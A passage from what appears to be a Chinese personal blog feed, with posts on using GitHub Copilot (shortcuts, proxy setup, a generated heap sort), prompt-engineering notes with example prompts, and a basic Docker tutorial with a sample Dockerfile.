    <content><![CDATA[<p>其实在上学期(2022年9月)我就成功申请了github学生认证, 拿到了免费使用copilot的机会. 但是那时copilot还不支持在代理服务器上使用, 于是体验AI编程的想法被搁置. 昨天心血来潮尝试了一下, 发现可以用代理服务器连接copilot了, 于是迫不及待开始学习体验</p>
<h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><p>Copilot 也提供了一些快捷键，可以很方便地使用。</p>
<ul>
<li>接受建议：<code>Tab</code></li>
<li>拒绝建议：<code>Esc</code></li>
<li>打开Copilot：<code>Ctrl + Enter</code> （会打开一个单独的面板，展示10个建议）</li>
<li>下一条建议：<code>Alt/Option + ]</code></li>
<li>上一条建议：<code>Alt/Option + [</code></li>
<li>触发行内Copilot：<code>Alt/Option + \</code> （copilot还没有给出建议或者建议被拒绝了，希望手工触发它提供建议）</li>
</ul>
<h2 id="HTTP代理"><a href="#HTTP代理" class="headerlink" title="HTTP代理"></a>HTTP代理</h2><p>有些用户(几乎所有中国大陆用户)可能会遇到连接不上的问题, 报错信息 <code>GitHub Copilot could not connect to server. Extension activation failed: &quot;connect ETIMEDOUT xxx.xxx.xxx:443&quot;</code></p>
<p>对于中国大陆用户, 首先你要有一个代理软件, 在设置中找得到代理地址和端口. 比如 <code>127.0.0.1:7890</code></p>
<p>然后打开VSCode的设置, 搜索 <code>http.proxy</code>, 输入 <code>127.0.0.1:7890</code>(你的代理地址和端口)</p>
<p>然后就可以啦</p>
<h1 id="copilot使用场景"><a href="#copilot使用场景" class="headerlink" title="copilot使用场景"></a>copilot使用场景</h1><h2 id="解决算法问题"><a href="#解决算法问题" class="headerlink" title="解决算法问题"></a>解决算法问题</h2><p>你可以先写出函数头, 然后在注释中解释函数的作用, 传入的参数和返回的参数, 然后copilot可以自动帮你生成代码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 使用heap sort对数组排序                          (自己写的)</span>
<span class="token comment"># 1. 将数组转换为最大堆</span>
<span class="token comment"># 2. 将最大堆的根节点与最后一个节点交换</span>
<span class="token comment"># 3. 将剩余的节点重新构造为最大堆</span>
<span class="token comment"># 4. 重复2,3步骤直到剩余节点数为1</span>
<span class="token keyword">def</span> <span class="token function">heap_sort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>                              <span class="token comment">#(自己写的)   </span>
    n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span>
    <span class="token comment"># 将数组转换为最大堆</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">//</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        heapify<span class="token punctuation">(</span>arr<span class="token punctuation">,</span> n<span class="token punctuation">,</span> i<span class="token punctuation">)</span>
    <span class="token comment"># 将最大堆的根节点与最后一个节点交换</span>
    <span class="token comment"># 将剩余的节点重新构造为最大堆</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        heapify<span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> arr

<span class="token keyword">def</span> <span class="token function">heapify</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> n<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span>							 <span class="token comment">#(自己写的)</span>
    <span class="token comment"># 将数组转换为最大堆</span>
    <span class="token comment"># n: 数组长度</span>
    <span class="token comment"># i: 当前节点索引</span>
    largest <span class="token operator">=</span> i
    l <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>i <span class="token operator">+</span> <span class="token number">1</span>
    r <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>i <span class="token operator">+</span> <span class="token number">2</span>
    <span class="token keyword">if</span> l <span class="token operator">&lt;</span> n <span class="token keyword">and</span> arr<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>largest<span class="token punctuation">]</span><span class="token punctuation">:</span>
        largest <span class="token operator">=</span> l
    <span class="token keyword">if</span> r <span class="token operator">&lt;</span> n <span class="token keyword">and</span> arr<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>largest<span class="token punctuation">]</span><span class="token punctuation">:</span>
        largest <span class="token operator">=</span> r
    <span class="token keyword">if</span> largest <span class="token operator">!=</span> i<span class="token punctuation">:</span>
        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>largest<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>largest<span class="token punctuation">]</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        heapify<span class="token punctuation">(</span>arr<span class="token punctuation">,</span> n<span class="token punctuation">,</span> largest<span class="token punctuation">)</span>
<span class="token comment"># 编写5组测试数据并进行测试                      #(自己写的)</span>
test_data <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">]</span>
<span class="token punctuation">]</span>
<span class="token keyword">for</span> data <span class="token keyword">in</span> test_data<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>heap_sort<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到, 在这个样例中, 50行代码, 我只写了四行注释, 其他代码和注释还有测试样例都是一直按 <code>Tab</code>键生成的, 不要太爽</p>
<h2 id="写注释"><a href="#写注释" class="headerlink" title="写注释"></a>写注释</h2><p>在行数上面一行写下 <code>/**</code>, copilot可以自动为你写下注释</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 使用heap sort对数组排序</span>
<span class="token comment"># 1. 将数组转换为最大堆</span>
<span class="token comment"># 2. 将最大堆的根节点与最后一个节点交换</span>
<span class="token comment"># 3. 将剩余的节点重新构造为最大堆</span>
<span class="token comment"># 4. 重复2,3步骤直到剩余节点数为1</span>

   <span class="token operator">/</span><span class="token operator">**</span>
    <span class="token operator">*</span> @param <span class="token punctuation">&#123;</span>number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span> nums
    <span class="token operator">*</span> @<span class="token keyword">return</span> <span class="token punctuation">&#123;</span>number<span class="token punctuation">&#125;</span>
    <span class="token operator">*</span><span class="token operator">/</span>

<span class="token keyword">def</span> <span class="token function">heap_sort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span>
    <span class="token comment"># 将数组转换为最大堆</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">//</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        heapify<span class="token punctuation">(</span>arr<span class="token punctuation">,</span> n<span class="token punctuation">,</span> i<span class="token punctuation">)</span>
    <span class="token comment"># 将最大堆的根节点与最后一个节点交换</span>
    <span class="token comment"># 将剩余的节点重新构造为最大堆</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        heapify<span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> arr

 <span class="token operator">/</span><span class="token operator">**</span>
    <span class="token operator">*</span> @param <span class="token punctuation">&#123;</span>number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span> arr
    <span class="token operator">*</span> @param <span class="token punctuation">&#123;</span>number<span class="token punctuation">&#125;</span> n
    <span class="token operator">*</span> @param <span class="token punctuation">&#123;</span>number<span class="token punctuation">&#125;</span> i
    <span class="token operator">*</span> @<span class="token keyword">return</span> <span class="token punctuation">&#123;</span>number<span class="token punctuation">&#125;</span>
    <span class="token operator">*</span><span class="token operator">/</span>
  
<span class="token keyword">def</span> <span class="token function">heapify</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> n<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 将数组转换为最大堆</span>
    <span class="token comment"># n: 数组长度</span>
    <span class="token comment"># i: 当前节点索引</span>
    largest <span class="token operator">=</span> i
    l <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>i <span class="token operator">+</span> <span class="token number">1</span>
    r <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>i <span class="token operator">+</span> <span class="token number">2</span>
    <span class="token keyword">if</span> l <span class="token operator">&lt;</span> n <span class="token keyword">and</span> arr<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>largest<span class="token punctuation">]</span><span class="token punctuation">:</span>
        largest <span class="token operator">=</span> l
    <span class="token keyword">if</span> r <span class="token operator">&lt;</span> n <span class="token keyword">and</span> arr<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>largest<span class="token punctuation">]</span><span class="token punctuation">:</span>
        largest <span class="token operator">=</span> r
    <span class="token keyword">if</span> largest <span class="token operator">!=</span> i<span class="token punctuation">:</span>
        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>largest<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>largest<span class="token punctuation">]</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        heapify<span class="token punctuation">(</span>arr<span class="token punctuation">,</span> n<span class="token punctuation">,</span> largest<span class="token punctuation">)</span>
<span class="token comment"># 编写5组测试数据并进行测试</span>
test_data <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">]</span>
<span class="token punctuation">]</span>
<span class="token keyword">for</span> data <span class="token keyword">in</span> test_data<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>heap_sort<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>lol 但是python的注释语法貌似不是 <code>/**</code></p>
<p><strong>Hope you have fun with copilot!</strong></p>
]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>chatgpt_提示工程_by_AndrewWu</title>
    <url>/2023/06/23/chatgpt_%E6%8F%90%E7%A4%BA%E5%B7%A5%E7%A8%8B_by_AndrewWu/</url>
    <content><![CDATA[<h1 id="prompt指南"><a href="#prompt指南" class="headerlink" title="prompt指南"></a>prompt指南</h1><h2 id="1-写出清晰具体的说明"><a href="#1-写出清晰具体的说明" class="headerlink" title="1:写出清晰具体的说明"></a>1:写出清晰具体的说明</h2><p><strong>策略 1</strong>：使用分隔符清楚地指示输入的不同部分</p>
<ul>
<li><p>三重引号：”””</p>
</li>
<li><p>三重反引号：&#96;&#96;&#96;</p>
</li>
<li><p>三连划线：—</p>
</li>
<li><p>尖括号：&lt; &gt;</p>
</li>
<li><p>XML 标签：<tag> </tag></p>
</li>
</ul>
<p><strong>策略 2</strong>：要求结构化输出</p>
<ul>
<li>JSON</li>
<li>超文本标记语言</li>
</ul>
<p><strong>策略 3</strong>：要求模型检查条件是否满足</p>
<p><strong>策略4</strong>: 在自然语言处理中，<a href="https://en.wikipedia.org/wiki/In-context_learning_(natural_language_processing)"><strong>上下文学习</strong></a>、<strong>少样本学习</strong>或少<strong>样本提示</strong>是一种提示技术，允许模型在尝试任务之前处理示例</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">prompt <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""
Your task is to answer in a consistent style.

&lt;child>: Teach me about patience.

&lt;grandparent>: The river that carves the deepest \ 
valley flows from a modest spring; the \ 
grandest symphony originates from a single note; \ 
the most intricate tapestry begins with a solitary thread.

&lt;child>: Teach me about resilience.
"""</span></span>
response <span class="token operator">=</span> get_completion<span class="token punctuation">(</span>prompt<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="2-给LLM时间思考"><a href="#2-给LLM时间思考" class="headerlink" title="2: 给LLM时间思考"></a>2: 给LLM时间思考</h2><p><strong>策略1</strong>: 制定完成任务所需步骤</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">prompt_2 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""
Your task is to perform the following actions: 
1 - Summarize the following text delimited by 
  &lt;> with 1 sentence.
2 - Translate the summary into French.
3 - List each name in the French summary.
4 - Output a json object that contains the 
  following keys: french_summary, num_names.

Use the following format:
Text: &lt;text to summarize>
Summary: &lt;summary>
Translation: &lt;summary translation>
Names: &lt;list of names in Italian summary>
Output JSON: &lt;json with summary and num_names>

Text: &lt;</span><span class="token interpolation"><span class="token punctuation">&#123;</span>text<span class="token punctuation">&#125;</span></span><span class="token string">>
"""</span></span>
response <span class="token operator">=</span> get_completion<span class="token punctuation">(</span>prompt_2<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nCompletion for prompt 2:"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">
Summary: Jack and Jill go on a quest to fetch water, but misfortune strikes and they tumble down the hill, returning home slightly battered but with their adventurous spirits undimmed. 
Translation: Jack et Jill partent en quête d&#39;eau, mais la malchance frappe et ils dégringolent la colline, rentrant chez eux légèrement meurtris mais avec leurs esprits aventureux intacts.
Names: Jack, Jill
Output JSON: &#123;&quot;french_summary&quot;: &quot;Jack et Jill partent en quête d&#39;eau, mais la malchance frappe et ils dégringolent la colline, rentrant chez eux légèrement meurtris mais avec leurs esprits aventureux intacts.&quot;, &quot;num_names&quot;: 2&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> <strong>策略 2</strong>：指示模型在得出结论之前先找出自己的解决方案</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">prompt <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""
Your task is to determine if the student's solution \
is correct or not.
To solve the problem do the following:
- First, work out your own solution to the problem. 
- Then compare your solution to the student's solution \ 
and evaluate if the student's solution is correct or not. 
Don't decide if the student's solution is correct until 
you have done the problem yourself.

Use the following format:
Question:
```
question here
```
Student's solution:
```
student's solution here
```
Actual solution:
```
steps to work out the solution and your solution here
```
Is the student's solution the same as actual solution \
just calculated:
```
yes or no
```
Student grade:
```
correct or incorrect
```

Question:
```
I'm building a solar power installation and I need help \
working out the financials. 
- Land costs $100 / square foot
- I can buy solar panels for $250 / square foot
- I negotiated a contract for maintenance that will cost \
me a flat $100k per year, and an additional $10 / square \
foot
What is the total cost for the first year of operations \
as a function of the number of square feet.
``` 
Student's solution:
```
Let x be the size of the installation in square feet.
Costs:
1. Land cost: 100x
2. Solar panel cost: 250x
3. Maintenance cost: 100,000 + 100x
Total cost: 100x + 250x + 100,000 + 100x = 450x + 100,000
```
Actual solution:
"""</span></span>
response <span class="token operator">=</span> get_completion<span class="token punctuation">(</span>prompt<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">Let x be the size of the installation in square feet.

Costs:
1. Land cost: 100x
2. Solar panel cost: 250x
3. Maintenance cost: 100,000 + 10x

Total cost: 100x + 250x + 100,000 + 10x &#x3D; 360x + 100,000

Is the student&#39;s solution the same as actual solution just calculated:
No

Student grade:
Incorrect<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="模型限制-幻觉"><a href="#模型限制-幻觉" class="headerlink" title="模型限制 :幻觉"></a>模型限制 :幻觉</h2><p>减少幻觉：</p>
<ul>
<li>让模型(或者自己)首先查找相关资料</li>
<li>然后根据相关信息回答问题</li>
</ul>
<h2 id="迭代询问"><a href="#迭代询问" class="headerlink" title="迭代询问"></a>迭代询问</h2><h3 id="通过迭代过程提示指导方针"><a href="#通过迭代过程提示指导方针" class="headerlink" title="通过迭代过程提示指导方针"></a>通过迭代过程提示指导方针</h3><ul>
<li>尝试一些事情，要清晰具体</li>
<li>分析为什么结果没有给出期望的输出</li>
<li>澄清指示，给予更多时间思考</li>
<li>用一批例子完善想法和提示</li>
<li>重复</li>
</ul>
<pre><code class="python">fact_sheet_chair = &quot;&quot;&quot;
OVERVIEW
- Part of a beautiful family of mid-century inspired office furniture, 
including filing cabinets, desks, bookcases, meeting tables, and more.
- Several options of shell color and base finishes.
- Available with plastic back and front upholstery (SWC-100) 
or full upholstery (SWC-110) in 10 fabric and 6 leather options.
- Base finish options are: stainless steel, matte black, 
gloss white, or chrome.
- Chair is available with or without armrests.
- Suitable for home or business settings.
- Qualified for contract use.

CONSTRUCTION
- 5-wheel plastic coated aluminum base.
- Pneumatic chair adjust for easy raise/lower action.

DIMENSIONS
- WIDTH 53 CM | 20.87”
- DEPTH 51 CM | 20.08”
- HEIGHT 80 CM | 31.50”
- SEAT HEIGHT 44 CM | 17.32”
- SEAT DEPTH 41 CM | 16.14”

OPTIONS
- Soft or hard-floor caster options.
- Two choices of seat foam densities: 
 medium (1.8 lb/ft3) or high (2.8 lb/ft3)
- Armless or 8 position PU armrests 

MATERIALS
SHELL BASE GLIDER
- Cast Aluminum with modified nylon PA6/PA66 coating.
- Shell thickness: 10 mm.
SEAT
- HD36 foam

COUNTRY OF ORIGIN
- Italy
&quot;&quot;&quot;

prompt = f&quot;&quot;&quot;
Your task is to help a marketing team create a 
description for a retail website of a product based 
on a technical fact sheet.

Write a product description based on the information 
provided in the technical specifications delimited by 
triple backticks.

The description is intended for furniture retailers, 
so should be technical in nature and focus on the 
materials the product is constructed from.

At the end of the description, include every 7-character 
Product ID in the technical specification.

After the description, include a table that gives the 
product&#39;s dimensions. The table should have two columns.
In the first column include the name of the dimension. 
In the second column include the measurements in inches only.

Give the table the title &#39;Product Dimensions&#39;.

Format everything as HTML that can be used in a website. 
Place the description in a &lt;div&gt; element.

Use at most 50 words.

Technical specifications: ```&#123;fact_sheet_chair&#125;```
&quot;&quot;&quot;

response = get_completion(prompt)
print(response)
</code></pre>
]]></content>
      <categories>
        <category>chatgpt</category>
      </categories>
      <tags>
        <tag>prompt engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>docker使用教程</title>
    <url>/2023/07/01/docker%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>先在自己的win电脑上下载docker desktop. 这里以构建python项目镜像为例</p>
<h3 id="创建dockerfile"><a href="#创建dockerfile" class="headerlink" title="创建dockerfile"></a>创建dockerfile</h3><p>Dockerfile是一个包含用户定义的指令的文本文档，它可以指定基本镜像，并包含创建容器时应运行的所有命令。以下是一个例子：</p>
<pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token comment"># 选择一个基础镜像</span>
<span class="token instruction"><span class="token keyword">FROM</span> python:3.8</span>

<span class="token comment"># 设置工作目录</span>
<span class="token instruction"><span class="token keyword">WORKDIR</span> /app</span>

<span class="token comment"># 将当前目录下的所有文件（除了.dockerignore排除的路径），复制到 /app下</span>
<span class="token instruction"><span class="token keyword">ADD</span> . /app</span>

<span class="token comment"># 安装项目需要的包</span>
<span class="token instruction"><span class="token keyword">RUN</span> pip install --no-cache-dir -r requirements.txt</span>

<span class="token comment"># 声明服务端口</span>
<span class="token instruction"><span class="token keyword">EXPOSE</span> 8080</span>

<span class="token comment"># 启动时运行 Python 应用</span>
<span class="token instruction"><span class="token keyword">CMD</span> [<span class="token string">"python"</span>, <span class="token string">"./your_script.py"</span>]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>需要替换的部分：</p>
<ul>
<li><code>python:3.8</code>: 你项目所使用的Python版本</li>
<li><code>./your_script.py</code>: 你需要运行的Python脚本的相对路径</li>
</ul>
<p>其它的基本不用变</p>
<h3 id="dockerignore文件"><a href="#dockerignore文件" class="headerlink" title=".dockerignore文件"></a>.dockerignore文件</h3><p>类似于 <code>.gitignore</code> 文件，<code>.dockerignore</code> 文件可以避免不必要的文件或目录被复制到Docker镜像中。</p>
<pre class="line-numbers language-none"><code class="language-none">__pycache__
*.pyc
*.pyo
*.pyd
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

